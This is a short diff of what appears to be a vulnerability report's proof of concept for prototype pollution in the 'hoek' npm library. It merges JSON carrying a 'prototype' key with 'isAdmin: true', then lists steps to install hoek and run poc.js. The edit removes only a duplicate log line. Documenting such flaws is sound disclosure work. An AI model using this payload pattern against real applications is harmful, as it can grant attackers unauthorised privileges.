@@ -8,7 +8,6 @@ var utils = require('hoek');
 var src = {};
 let object = utils.merge({}, JSON.parse('{ "myProperty": "a", "prototype" : { "isAdmin" : true } }'));
 console.log(object.prototype.isAdmin);
-console.log(object.prototype.isAdmin);
 ```
 2. Execute command npm install hoek
 3. Execute command node poc.js
